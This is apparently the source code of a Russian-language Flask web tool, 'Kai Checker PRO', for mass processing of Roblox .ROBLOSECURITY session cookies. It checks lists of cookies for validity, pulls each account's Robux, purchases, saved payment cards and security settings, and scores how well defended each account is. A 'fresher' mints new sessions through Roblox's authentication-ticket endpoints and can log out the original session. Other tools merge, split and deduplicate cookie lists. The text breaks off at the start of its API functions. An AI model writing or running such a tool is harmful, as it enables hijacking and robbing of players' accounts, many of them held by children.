import os
import time
import logging
import re
import urllib3
import json
import requests
import zipfile
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, send_from_directory
from io import BytesIO

# ===== НАСТРОЙКИ =====
os.makedirs("downloads", exist_ok=True)
os.makedirs("uploads", exist_ok=True)
os.makedirs("temp", exist_ok=True)
os.makedirs("history", exist_ok=True)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CURRENT_UPLOADED_FILE = None
CHECKER_HISTORY_FILE = "history/checker_history.json"
FRESHER_HISTORY_FILE = "history/fresher_history.json"

# ============================================================
# ФУНКЦИИ ИСТОРИИ
# ============================================================

def load_history(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return []

def save_history(filepath, data):
    try:
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Error saving history: {e}")

def add_to_checker_history(entry):
    history = load_history(CHECKER_HISTORY_FILE)
    history.append({
        'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
        'total': entry.get('total', 0),
        'valid': entry.get('valid', 0),
        'cookies': entry.get('cookies', [])[:20],
        'download_url': entry.get('download_url', '')
    })
    if len(history) > 50:
        history = history[-50:]
    save_history(CHECKER_HISTORY_FILE, history)

def add_to_fresher_history(entry):
    history = load_history(FRESHER_HISTORY_FILE)
    history.append({
        'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
        'mode': entry.get('mode', 'duplicate'),
        'refreshed_count': entry.get('refreshed_count', 0),
        'cookies': entry.get('cookies', [])[:20]
    })
    if len(history) > 50:
        history = history[-50:]
    save_history(FRESHER_HISTORY_FILE, history)

# ============================================================
# РАБОТА С КУКИ И ROBLOX API (ВАЛИДАТОР И ФРЕШЕР)
# ============================================================

def clean_single_cookie(cookie: str) -> str:
    cleaned = cookie.strip()
    if ".ROBLOSECURITY=" in cleaned:
        cleaned = cleaned.split(".ROBLOSECURITY=")[1].split(";")[0].strip()
    return cleaned

def validate_cookie(cookie: str) -> bool:
    """Быстрый валидатор сессии"""
    clean_cookie = clean_single_cookie(cookie)
    if not clean_cookie:
        return False
    try:
        r = requests.get(
            'https://users.roblox.com/v1/users/authenticated',
            cookies={'.ROBLOSECURITY': clean_cookie},
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
            timeout=10,
            verify=False
        )
        return r.status_code == 200 and 'id' in r.json()
    except:
        return False

def get_full_info(cookie: str) -> dict:
    cleaned_cookie = clean_single_cookie(cookie)
    info = {
        'status': '⚠️', 'Username': '?', 'UserID': '?', 'Robux': 0,
        'TotalRAP': 0, 'Created': '?', 'Country': '?',
        'EmailSet': False, 'TwoFactorEnabled': False,
        'AccountPinEnabled': False, 'PhoneSet': False,
        'SecurityStatus': '⚠️ НИЗКИЙ', 'Cookie': f".ROBLOSECURITY={cleaned_cookie}",
        'PurchasedGamepasses': {}, 'CreditCardsCount': 0,
        'IsPremium': False, 'DonationTotal': 0
    }
    try:
        s = requests.Session()
        s.headers.update({
            'Cookie': f'.ROBLOSECURITY={cleaned_cookie}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json'
        })
        
        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=15, verify=False)
        if r.status_code == 200:
            d = r.json()
            if 'id' in d:
                info['UserID'] = d.get('id')
                info['Username'] = d.get('name')
                info['status'] = '✅'
            else:
                info['status'] = '❌'
                return info
        else:
            info['status'] = '❌'
            return info

        uid = info['UserID']

        def g(url):
            try:
                r = s.get(url, verify=False, timeout=10)
                return r.json() if r.status_code == 200 else {}
            except:
                return {}

        d = g('https://www.roblox.com/my/settings/json')
        if d:
            sec = d.get('MyAccountSecurityModel', {})
            info['EmailSet'] = sec.get('IsEmailSet', False)
            info['TwoFactorEnabled'] = sec.get('IsTwoStepEnabled', False)
            info['AccountPinEnabled'] = sec.get('IsAccountPinEnabled', False)
            info['PhoneSet'] = sec.get('IsPhoneSet', False)
            bill = d.get('BillingModel', {})
            info['CreditCardsCount'] = len(bill.get('SavedPaymentMethods', []))

        prem = g(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions')
        if prem and prem.get('isSubscribed'):
            info['IsPremium'] = True

        rd = g(f'https://users.roblox.com/v1/users/{uid}')
        if rd:
            try:
                dt = datetime.fromisoformat(rd.get('created', '').replace('Z', '+00:00'))
                info['Created'] = dt.strftime('%d.%m.%Y')
            except:
                pass

        rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
        if rb:
            info['Robux'] = rb.get('robux', 0)

        country = g('https://users.roblox.com/v1/users/authenticated/country-code')
        if country:
            info['Country'] = country.get('countryCode', '?')

        try:
            gp_url = f"https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase"
            cursor = ""
            page = 0
            gamepasses_dict = {}
            total_donated = 0
            while page < 10:
                url = gp_url + f"&cursor={cursor}" if cursor else gp_url
                r = s.get(url, verify=False, timeout=12)
                if r.status_code != 200:
                    break
                data = r.json()
                for item in data.get('data', []):
                    details = item.get('details', {})
                    price = abs(item.get('currency', {}).get('amount', 0))
                    total_donated += price
                    if price >= 50:
                        name = details.get('name', 'Товар')
                        place = details.get('place', {})
                        place_name = place.get('name', 'Другие игры')
                        if place_name not in gamepasses_dict:
                            gamepasses_dict[place_name] = []
                        gamepasses_dict[place_name].append({'name': name, 'price': price})
                cursor = data.get('nextPageCursor')
                if not cursor:
                    break
                page += 1
                time.sleep(0.15)
            info['PurchasedGamepasses'] = gamepasses_dict
            info['DonationTotal'] = total_donated
        except:
            pass

        score = 0
        if info['EmailSet']: score += 1
        if info['TwoFactorEnabled']: score += 2
        if info['AccountPinEnabled']: score += 1
        if info['PhoneSet']: score += 1
        info['SecurityStatus'] = '🔒 ВЫСОКИЙ' if score >= 4 else ('🔐 СРЕДНИЙ' if score >= 2 else '⚠️ НИЗКИЙ')
    except Exception as e:
        logger.error(f"Check error: {e}")
        info['status'] = '❌'
    return info

def refresh_roblox_cookie(raw_cookie: str, mode: str = "duplicate") -> str:
    """Исправленное и обновленное перевыпуск сессии (Фрешер)"""
    clean_cookie = clean_single_cookie(raw_cookie)
    if not clean_cookie:
        return None

    # 1. Предварительная проверка входного кука
    if not validate_cookie(clean_cookie):
        logger.warning("Фрешер: Исходный кук невалиден.")
        return None

    s = requests.Session()
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Referer': 'https://www.roblox.com/',
        'Origin': 'https://www.roblox.com'
    })
    s.cookies.set(".ROBLOSECURITY", clean_cookie, domain=".roblox.com")

    try:
        # 2. Получение X-CSRF-TOKEN
        res = s.post("https://auth.roblox.com/v2/login", verify=False, timeout=10)
        csrf_token = res.headers.get("x-csrf-token")
        if not csrf_token:
            return None
        s.headers["X-CSRF-TOKEN"] = csrf_token

        # 3. Генерация тикета авторизации
        ticket_res = s.post("https://auth.roblox.com/v1/authentication-ticket", verify=False, timeout=10)
        auth_ticket = ticket_res.headers.get("rbx-authentication-ticket")
        if not auth_ticket:
            return None

        # 4. Обмен тикета на обновленную сессию
        redeem_headers = {
            'RBX-For-Game-Auth': 'true',
            'RBX-Authentication-Ticket': auth_ticket,
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': csrf_token
        }
        
        redeem_res = s.post(
            "https://auth.roblox.com/v1/authentication-ticket/redeem",
            json={"authenticationTicket": auth_ticket},
            headers=redeem_headers,
            verify=False,
            timeout=10
        )

        new_cookie_val = None
        for cookie in redeem_res.cookies:
            if cookie.name == ".ROBLOSECURITY":
                new_cookie_val = cookie.value
                break

        if not new_cookie_val and "Set-Cookie" in redeem_res.headers:
            match = re.search(r'\.ROBLOSECURITY=(_\|WARNING:-DO-NOT-SHARE-THIS[^\s;]+)', redeem_res.headers["Set-Cookie"])
            if match:
                new_cookie_val = match.group(1)

        if not new_cookie_val:
            return None

        # 5. Проверка работоспособности нового кука
        if not validate_cookie(new_cookie_val):
            logger.error("Сгенерированный кук не прошёл итоговую валидацию!")
            return None

        formatted_new_cookie = f".ROBLOSECURITY={new_cookie_val}"

        # 6. Если выбран режим kill (сброс старой сессии)
        if mode == "kill":
            try:
                s.post("https://auth.roblox.com/v2/logout", verify=False, timeout=5)
            except Exception as e:
                logger.error(f"Ошибка при логауте старой сессии: {e}")

        return formatted_new_cookie

    except Exception as e:
        logger.error(f"Ошибка Фрешера: {e}")
        return None

def format_short_report(info):
    """Мини-отчет для веб-интерфейса"""
    if info['status'] != '✅':
        return f"❌ Невалидный кук\nCookie: {info['Cookie']}"
    gp = info.get('PurchasedGamepasses', {})
    total_gp = sum(p['price'] for passes in gp.values() for p in passes)
    
    r = f"📋 {info['Username']} [{info['UserID']}]\n"
    r += f"🟢 VALID | 📅 {info['Created']} | 🌍 {info['Country']}\n"
    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💸 Донат: ⏣ {info['DonationTotal']:,}\n"
    r += f"🛡️ Защита: {info['SecurityStatus']}\n"
    r += f"├ Почта: {'✅' if info['EmailSet'] else '❌'} | 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n"
    r += f"└ PIN: {'✅' if info['AccountPinEnabled'] else '❌'} | Тел: {'✅' if info['PhoneSet'] else '❌'}\n"
    if gp:
        r += f"📦 ГЕЙМПАССЫ ({total_gp:,} R$):\n"
        for game, passes in list(gp.items())[:3]:
            r += f"   🎮 {game}:\n"
            for p in passes[:6]:
                r += f"      └ {p['name']} — ⏣ {p['price']:,}\n"
    r += f"\n🍪 COOKIE:\n{info['Cookie']}"
    return r

def generate_full_txt_report(info):
    """Большой TXT-отчет для скачиваемого архива"""
    if info['status'] != '✅':
        return f"❌ Невалидный кук\nCookie: {info['Cookie']}"
    gp = info.get('PurchasedGamepasses', {})
    
    r = "=" * 60 + "\n"
    r += f"ROBLOX COOKIE CHECK REPORT\n"
    r += "=" * 60 + "\n"
    r += f"Аккаунт: {info['Username']} [{info['UserID']}]\n"
    r += f"Создан: {info['Created']} | Страна: {info['Country']}\n"
    r += f"Robux: {info['Robux']:,} | Донат: {info['DonationTotal']:,}\n"
    r += f"Premium: {'Да' if info['IsPremium'] else 'Нет'} | Сохраненные карты: {info['CreditCardsCount']}\n"
    r += "-" * 60 + "\n"
    r += f"БЕЗОПАСНОСТЬ И ВАЛИДАЦИЯ:\n"
    r += f"  Уровень защиты: {info['SecurityStatus']}\n"
    r += f"  Привязанная почта: {'Да' if info['EmailSet'] else 'Нет'}\n"
    r += f"  Двухфакторка (2FA): {'Да' if info['TwoFactorEnabled'] else 'Нет'}\n"
    r += f"  Установлен PIN:     {'Да' if info['AccountPinEnabled'] else 'Нет'}\n"
    r += f"  Привязан телефон:   {'Да' if info['PhoneSet'] else 'Нет'}\n"
    r += "=" * 60 + "\n"
    if gp:
        r += "ГЕЙМПАССЫ И ПОКУПКИ:\n"
        for game, passes in gp.items():
            r += f"  🎮 {game}:\n"
            for p in passes:
                r += f"    └ {p['name']} ({p['price']} R$)\n"
        r += "=" * 60 + "\n"
    r += f"COOKIE:\n{info['Cookie']}\n\n"
    r += f"Generated: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n"
    return r

# ============================================================
# ИНСТРУМЕНТЫ
# ============================================================

def merge_cookie_files(contents):
    all_cookies = set()
    for content in contents:
        for line in content.split('\n'):
            line = line.strip()
            if len(line) > 20:
                all_cookies.add(line)
    return '\n'.join(sorted(all_cookies))

def split_cookies_by_count(content, count):
    cookies = [l.strip() for l in content.split('\n') if len(l) > 20]
    files = []
    for i in range(0, len(cookies), count):
        files.append('\n'.join(cookies[i:i+count]))
    return files

def split_cookies_by_files(content, num):
    cookies = [l.strip() for l in content.split('\n') if len(l) > 20]
    if num <= 0:
        return []
    per_file = len(cookies) // num
    rem = len(cookies) % num
    files = []
    idx = 0
    for i in range(num):
        end = idx + per_file + (1 if i < rem else 0)
        files.append('\n'.join(cookies[idx:end]))
        idx = end
    return files

def remove_duplicates(content):
    cookies = [l.strip() for l in content.split('\n') if len(l) > 20]
    return '\n'.join(list(dict.fromkeys(cookies)))

def clean_cookies(content):
    cookies = []
    for line in content.split('\n'):
        line = line.strip()
        if not line:
            continue
        if '.ROBLOSECURITY=' in line:
            val = line.split('.ROBLOSECURITY=')[-1].split(';')[0].strip()
            cookies.append(f'.ROBLOSECURITY={val}')
        elif len(line) > 50 and not line.startswith('#'):
            cookies.append(f'.ROBLOSECURITY={line}')
    return '\n'.join(cookies)

# ============================================================
# FLASK APP
# ============================================================

app = Flask(__name__)

HTML = r"""<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kai Checker PRO</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family:'Inter',sans-serif;
            min-height:100vh;
            padding:24px;
            background:#0b081a;
            background-image:radial-gradient(circle at 10% 20%, #1a1040 0%, #0b081a 80%);
        }
        .wrapper{
            max-width:1400px;
            margin:0 auto;
            padding:30px;
            background:rgba(18,10,40,0.95);
            border:2px solid #6c5ce7;
            border-radius:32px;
            box-shadow:0 0 60px rgba(108,92,231,0.25);
        }
        ::-webkit-scrollbar{width:6px;height:6px}
        ::-webkit-scrollbar-track{background:#0d0722;border-radius:8px}
        ::-webkit-scrollbar-thumb{background:#a855f7;border-radius:8px}
        .header{
            display:flex;
            justify-content:space-between;
            align-items:center;
            padding:20px 0 16px;
            border-bottom:1px solid #2a1a50;
            margin-bottom:30px;
        }
        .logo{
            font-size:34px;
            font-weight:900;
            font-style:italic;
            background:linear-gradient(135deg,#c084fc,#f472b6);
            -webkit-background-clip:text;
            -webkit-text-fill-color:transparent;
        }
        .tabs{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:28px}
        .tab{
            padding:10px 22px;
            background:rgba(26,16,64,0.9);
            border:1px solid #2a1a50;
            border-radius:40px;
            color:#9880c0;
            cursor:pointer;
            font-size:14px;
            font-weight:600;
            transition:all 0.25s;
            user-select:none;
        }
        .tab:hover{border-color:#a855f7;color:#fff;transform:translateY(-2px)}
        .tab.active{
            border-color:#c084fc;
            background:rgba(168,85,247,0.3);
            color:#c084fc;
            box-shadow:0 0 20px rgba(168,85,247,0.2);
        }
        .tab-content{display:none}
        .tab-content.active{display:block;animation:fadeUp 0.3s ease}
        @keyframes fadeUp{
            0%{opacity:0;transform:translateY(12px)}
            100%{opacity:1;transform:translateY(0)}
        }
        .card{
            background:rgba(18,10,40,0.9);
            border:1px solid #2a1a50;
            border-radius:20px;
            padding:28px 30px;
            margin-bottom:24px;
            box-shadow:0 20px 40px rgba(0,0,0,0.6);
        }
        .card h2{
            font-size:20px;
            color:#d4c0ff;
            margin-bottom:18px;
            display:flex;
            align-items:center;
            gap:10px;
            font-weight:700;
        }
        .btn{
            padding:12px 28px;
            border:none;
            border-radius:40px;
            font-size:14px;
            font-weight:700;
            cursor:pointer;
            transition:all 0.25s;
            display:inline-flex;
            align-items:center;
            gap:10px;
            text-decoration:none;
            color:#fff;
        }
        .btn-primary{
            background:linear-gradient(135deg,#a855f7,#d946ef);
            box-shadow:0 8px 24px rgba(168,85,247,0.25);
        }
        .btn-primary:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(168,85,247,0.4)}
        .btn-secondary{
            background:rgba(255,255,255,0.06);
            border:1px solid #2a1a50;
            color:#d4c0ff;
        }
        .btn-secondary:hover{background:rgba(255,255,255,0.1)}
        .btn-danger{
            background:rgba(220,38,38,0.2);
            border:1px solid rgba(220,38,38,0.3);
            color:#fca5a5;
        }
        .btn-danger:hover{background:rgba(220,38,38,0.3)}
        .btn-sm{padding:8px 16px;font-size:12px}
        .toggle-group{
            display:flex;
            background:#0d0722;
            border:1px solid #2a1a50;
            border-radius:16px;
            padding:4px;
            gap:4px;
            margin-bottom:18px;
        }
        .toggle-btn{
            flex:1;
            padding:12px 16px;
            background:transparent;
            border:none;
            border-radius:12px;
            color:#9880c0;
            font-size:13px;
            font-weight:600;
            cursor:pointer;
            transition:all 0.25s;
            text-align:center;
        }
        .toggle-btn.active{
            background:linear-gradient(135deg,rgba(168,85,247,0.3),rgba(217,70,239,0.3));
            color:#c084fc;
            border:1px solid rgba(192,132,252,0.4);
            box-shadow:0 4px 15px rgba(168,85,247,0.2);
        }
        textarea,.upload-area,input[type="number"]{
            width:100%;
            padding:14px 16px;
            background:#0d0722;
            border:1px solid #2a1a50;
            border-radius:14px;
            color:#fff;
            font-family:'Inter',monospace;
            font-size:14px;
            resize:vertical;
            transition:0.2s;
        }
        textarea:focus,.upload-area:focus-within,input[type="number"]:focus{
            border-color:#a855f7;
            outline:none;
            box-shadow:0 0 0 3px rgba(168,85,247,0.2);
        }
        .upload-area{
            min-height:100px;
            display:flex;
            flex-direction:column;
            align-items:center;
            justify-content:center;
            cursor:pointer;
            border-style:dashed;
            gap:6px;
            text-align:center;
        }
        .result-box{
            background:#0d0722;
            border:1px solid #2a1a50;
            border-radius:16px;
            padding:18px;
            margin-top:20px;
            max-height:500px;
            overflow-y:auto;
            font-family:'Inter',monospace;
            font-size:13px;
            color:#fff;
            white-space:pre-wrap;
            word-break:break-all;
        }
        .progress-bar{
            margin-top:12px;
            background:#0d0722;
            border-radius:40px;
            height:6px;
            overflow:hidden;
            border:1px solid #1a1040;
        }
        .progress-fill{
            height:100%;
            width:0%;
            background:linear-gradient(90deg,#a855f7,#ec4899);
            transition:width 0.3s;
        }
        .footer{
            text-align:center;
            padding:30px 0 12px;
            color:#4a3a6a;
            font-size:13px;
            border-top:1px solid #1a1040;
            margin-top:30px;
        }
        .tool-grid{
            display:grid;
            grid-template-columns:repeat(auto-fit,minmax(400px,1fr));
            gap:20px;
        }
        .tool-card{
            background:rgba(18,10,40,0.9);
            border:1px solid #2a1a50;
            border-radius:20px;
            padding:24px;
            transition:all 0.3s;
            display:flex;
            flex-direction:column;
        }
        .tool-card:hover{
            border-color:#6c5ce7;
            box-shadow:0 8px 32px rgba(108,92,231,0.2);
        }
        .tool-card h3{
            font-size:16px;
            color:#c084fc;
            margin-bottom:8px;
            font-weight:700;
        }
        .tool-card .desc{
            color:#9880c0;
            font-size:13px;
            margin-bottom:16px;
            line-height:1.5;
        }
        .tool-card .upload-area{min-height:70px;margin-bottom:12px}
        .input-row{
            display:flex;
            gap:10px;
            align-items:center;
            margin-bottom:12px;
        }
        .input-row input{flex:1}
        .input-row span{color:#9880c0;font-size:14px;white-space:nowrap}
        .tool-card .btn{margin-top:auto}
        .tool-card .result-box{max-height:150px;margin-top:12px;font-size:12px}
        .file-list{
            max-height:150px;
            overflow-y:auto;
            margin:10px 0;
            padding:8px;
            background:#0d0722;
            border-radius:10px;
            border:1px solid #1a1040;
        }
        .file-item{
            background:rgba(26,16,64,0.6);
            padding:8px 12px;
            margin:4px 0;
            border-radius:8px;
            font-size:12px;
            color:#9880c0;
            border:1px solid #2a1a50;
        }
        .history-section{margin-top:24px;border-top:1px solid #1a1040;padding-top:20px}
        .history-section h3{
            font-size:16px;
            color:#d4c0ff;
            margin-bottom:14px;
            display:flex;
            align-items:center;
            justify-content:space-between;
        }
        .history-item{
            background:rgba(14,8,30,0.8);
            border:1px solid #1a1040;
            border-radius:12px;
            padding:14px 16px;
            margin-bottom:10px;
            cursor:pointer;
            transition:all 0.2s;
        }
        .history-item:hover{border-color:#a855f7;background:rgba(26,16,64,0.6)}
        .hist-header{
            display:flex;
            justify-content:space-between;
            align-items:center;
            margin-bottom:8px;
        }
        .hist-date{color:#a855f7;font-size:13px;font-weight:600}
        .hist-stats{color:#9880c0;font-size:12px}
        .hist-detail{
            display:none;
            margin-top:10px;
            white-space:pre-wrap;
            font-size:12px;
            color:#d4c0ff;
            max-height:200px;
            overflow-y:auto;
            word-break:break-all;
        }
        .empty-history{text-align:center;padding:30px;color:#4a3a6a;font-size:14px}
        .flex-row{display:flex;flex-wrap:wrap;gap:18px}
        .flex-2{flex:2}
        .flex-1{flex:1}
        .mt-12{margin-top:12px}
        .mt-18{margin-top:18px}
        .gap-12{display:flex;gap:12px;flex-wrap:wrap}
        .gap-8{display:flex;gap:8px}
        .timer{
            color:#00b894;
            font-family:'Inter',monospace;
            font-weight:600;
            font-size:13px;
            background:rgba(0,184,148,0.1);
            padding:4px 10px;
            border-radius:12px;
            border:1px solid rgba(0,184,148,0.2);
        }
        .badge{color:#4a3a6a;font-size:14px}
        .status-info{margin-top:8px;color:#00b894;font-size:13px}
    </style>
</head>
<body>
<div class="wrapper">
    <div class="header">
        <div class="logo">KAI CHECKER</div>
        <div style="display:flex;align-items:center;gap:15px;">
            <span class="timer" id="sessionTimer">⏱️ 00:00:00</span>
            <span class="badge">⚡ PRO</span>
        </div>
    </div>

    <div class="tabs">
        <div class="tab active" data-tab="checker">🔍 Чекер</div>
        <div class="tab" data-tab="fresher">🔄 Фрешер</div>
        <div class="tab" data-tab="tools">🧰 Инструменты</div>
    </div>

    <!-- ЧЕКЕР -->
    <div class="tab-content active" id="tab-checker">
        <div class="card">
            <h2>🔍 Проверка куков (Массовая)</h2>
            <div class="flex-row">
                <div class="flex-2">
                    <textarea id="manualCookies" placeholder="Вставь куки сюда (каждый с новой строки) или загрузи txt файл справа..." rows="6"></textarea>
                    <div class="status-info" id="fileStatusInfo"></div>
                </div>
                <div class="flex-1">
                    <div class="upload-area" onclick="document.getElementById('fullFile').click()">
                        <p>📁 <strong>Загрузить .txt</strong></p>
                        <p style="font-size:12px;color:#9880c0;">Файл сохранится на сервере</p>
                    </div>
                    <input type="file" id="fullFile" accept=".txt" style="display:none;">
                </div>
            </div>
            <div class="mt-18 gap-12">
                <button class="btn btn-primary" onclick="runFullcheck()">🚀 Запустить проверку</button>
                <button class="btn btn-secondary" onclick="clearInputs()">🧹 Очистить</button>
            </div>
            <div class="progress-bar"><div class="progress-fill" id="checkerProgress"></div></div>
            <div class="result-box" id="fullcheckResult">Результаты появятся здесь...</div>
        </div>
        <div class="card history-section">
            <h3>📋 История проверок <button class="btn btn-danger btn-sm" onclick="clearCheckerHistory()">🗑️ Очистить</button></h3>
            <div id="checkerHistoryList"><div class="empty-history">Загрузка...</div></div>
        </div>
    </div>

    <!-- ФРЕШЕР -->
    <div class="tab-content" id="tab-fresher">
        <div class="card">
            <h2>🔄 Фрешер сессий</h2>
            <label style="color:#d4c0ff;font-size:14px;font-weight:600;display:block;margin-bottom:8px;">Режим обновления:</label>
            <div class="toggle-group">
                <button class="toggle-btn active" id="modeDuplicate" onclick="setFresherMode('duplicate')">♻️ Дублировать (оставить старый)</button>
                <button class="toggle-btn" id="modeKill" onclick="setFresherMode('kill')">💀 Сбросить сессию</button>
            </div>
            <input type="hidden" id="fresherMode" value="duplicate">
            <div class="flex-row">
                <div class="flex-2">
                    <textarea id="fresherCookies" placeholder="Вставьте куки для обновления..." rows="6"></textarea>
                </div>
                <div class="flex-1">
                    <div class="upload-area" onclick="document.getElementById('fresherFile').click()">
                        <p>📁 <strong>Загрузить .txt</strong></p>
                    </div>
                    <input type="file" id="fresherFile" accept=".txt" style="display:none;">
                </div>
            </div>
            <div class="mt-18 gap-12">
                <button class="btn btn-primary" onclick="runFresher()">⚡ Обновить сессии</button>
                <button class="btn btn-secondary" onclick="document.getElementById('fresherCookies').value='';document.getElementById('fresherResult').textContent='Результаты появятся здесь...';">🧹 Очистить</button>
            </div>
            <div class="result-box" id="fresherResult">Результаты фрешера появятся здесь...</div>
        </div>
        <div class="card history-section">
            <h3>📋 История обновлений <button class="btn btn-danger btn-sm" onclick="clearFresherHistory()">🗑️ Очистить</button></h3>
            <div id="fresherHistoryList"><div class="empty-history">Загрузка...</div></div>
        </div>
    </div>

    <!-- ИНСТРУМЕНТЫ -->
    <div class="tab-content" id="tab-tools">
        <div class="tool-grid">
            <!-- Слияние -->
            <div class="tool-card">
                <h3>🔗 Слияние файлов</h3>
                <p class="desc">Объедините несколько .txt файлов с куками в один. Дубликаты удаляются автоматически.</p>
                <div class="upload-area" onclick="document.getElementById('mergeFiles').click()">
                    <p>📁 <strong>Выбрать файлы</strong></p>
                    <span style="font-size:11px;color:#6b5b8a;">Минимум 2 файла</span>
                </div>
                <input type="file" id="mergeFiles" accept=".txt" multiple style="display:none;">
                <div class="file-list" id="mergeFileList"></div>
                <button class="btn btn-primary" onclick="mergeCookies()" style="width:100%;">🔄 Объединить</button>
                <div class="result-box" id="mergeResult">Результат...</div>
            </div>

            <!-- Разделение по количеству -->
            <div class="tool-card">
                <h3>✂️ По количеству</h3>
                <p class="desc">Разделите файл на части по N куки в каждой.</p>
                <div class="upload-area" onclick="document.getElementById('splitCountFile').click()">
                    <p>📁 <strong>Загрузить файл</strong></p>
                </div>
                <input type="file" id="splitCountFile" accept=".txt" style="display:none;">
                <div class="input-row">
                    <input type="number" id="splitCount" placeholder="Кол-во в файле" value="100" min="1">
                    <span>шт.</span>
                </div>
                <button class="btn btn-primary" onclick="splitByCount()" style="width:100%;">📦 Разделить</button>
                <div class="result-box" id="splitCountResult">Результат...</div>
            </div>

            <!-- Разделение на N файлов -->
            <div class="tool-card">
                <h3>📊 На N файлов</h3>
                <p class="desc">Равномерно распределите куки на указанное количество файлов.</p>
                <div class="upload-area" onclick="document.getElementById('splitFilesFile').click()">
                    <p>📁 <strong>Загрузить файл</strong></p>
                </div>
                <input type="file" id="splitFilesFile" accept=".txt" style="display:none;">
                <div class="input-row">
                    <input type="number" id="splitFilesCount" placeholder="Количество файлов" value="5" min="1">
                    <span>файлов</span>
                </div>
                <button class="btn btn-primary" onclick="splitByFiles()" style="width:100%;">📂 Разделить</button>
                <div class="result-box" id="splitFilesResult">Результат...</div>
            </div>

            <!-- Очистка -->
            <div class="tool-card">
                <h3>🧹 Очистка</h3>
                <p class="desc">Удалите дубликаты или приведите куки к формату .ROBLOSECURITY=...</p>
                <textarea id="cleanCookiesInput" placeholder="Вставьте куки..." rows="4"></textarea>
                <div class="gap-8 mt-12">
                    <button class="btn btn-primary" onclick="cleanCookiesAction('deduplicate')" style="flex:1;">🔄 Дубликаты</button>
                    <button class="btn btn-secondary" onclick="cleanCookiesAction('format')" style="flex:1;">📝 Формат</button>
                </div>
                <div class="result-box" id="cleanResult">Результат...</div>
            </div>
        </div>
    </div>

    <div class="footer">KAI CHECKER · PRO</div>
</div>

<script>
// Таймер сессии
let startTime = Date.now();
setInterval(() => {
    let d = Math.floor((Date.now() - startTime) / 1000);
    let h = String(Math.floor(d / 3600)).padStart(2, '0');
    let m = String(Math.floor((d % 3600) / 60)).padStart(2, '0');
    let s = String(d % 60).padStart(2, '0');
    let el = document.getElementById('sessionTimer');
    if (el) el.textContent = '⏱️ ' + h + ':' + m + ':' + s;
}, 1000);

// Переключение вкладок
document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', function() {
        let tabId = this.getAttribute('data-tab');
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        this.classList.add('active');
        let target = document.getElementById('tab-' + tabId);
        if (target) target.classList.add('active');
        if (tabId === 'checker') loadCheckerHistory();
        if (tabId === 'fresher') loadFresherHistory();
    });
});

// Режим фрешера
function setFresherMode(mode) {
    document.getElementById('fresherMode').value = mode;
    document.getElementById('modeDuplicate').classList.toggle('active', mode === 'duplicate');
    document.getElementById('modeKill').classList.toggle('active', mode === 'kill');
}

// Загрузка файла чекера
document.getElementById('fullFile').addEventListener('change', async function(e) {
    if (this.files && this.files[0]) {
        let file = this.files[0];
        let fd = new FormData();
        fd.append('file', file);
        document.getElementById('fileStatusInfo').textContent = '⏳ Загрузка...';
        try {
            let r = await fetch('/api/upload', { method: 'POST', body: fd });
            let d = await r.json();
            if (d.success) {
                document.getElementById('fileStatusInfo').textContent = '✅ Файл сохранен!';
                let reader = new FileReader();
                reader.onload = function(evt) {
                    document.getElementById('manualCookies').value = evt.target.result;
                };
                reader.readAsText(file);
            } else {
                document.getElementById('fileStatusInfo').textContent = '❌ Ошибка';
            }
        } catch(err) {
            document.getElementById('fileStatusInfo').textContent = '❌ Ошибка сети';
        }
    }
});

// Загрузка файла фрешера
document.getElementById('fresherFile').addEventListener('change', function(e) {
    if (this.files && this.files[0]) {
        let reader = new FileReader();
        reader.onload = function(evt) {
            document.getElementById('fresherCookies').value = evt.target.result;
        };
        reader.readAsText(this.files[0]);
    }
});

// Слияние - показ списка файлов
document.getElementById('mergeFiles').addEventListener('change', function(e) {
    let list = document.getElementById('mergeFileList');
    list.innerHTML = '';
    if (this.files) {
        Array.from(this.files).forEach((f, i) => {
            let div = document.createElement('div');
            div.className = 'file-item';
            div.textContent = (i+1) + '. ' + f.name + ' (' + (f.size/1024).toFixed(1) + ' KB)';
            list.appendChild(div);
        });
    }
});

// Разделение - чтение файлов
document.getElementById('splitCountFile').addEventListener('change', function(e) {
    if (this.files && this.files[0]) {
        let reader = new FileReader();
        reader.onload = function(evt) { window.splitCountContent = evt.target.result; };
        reader.readAsText(this.files[0]);
    }
});
document.getElementById('splitFilesFile').addEventListener('change', function(e) {
    if (this.files && this.files[0]) {
        let reader = new FileReader();
        reader.onload = function(evt) { window.splitFilesContent = evt.target.result; };
        reader.readAsText(this.files[0]);
    }
});

// ===== API ФУНКЦИИ =====

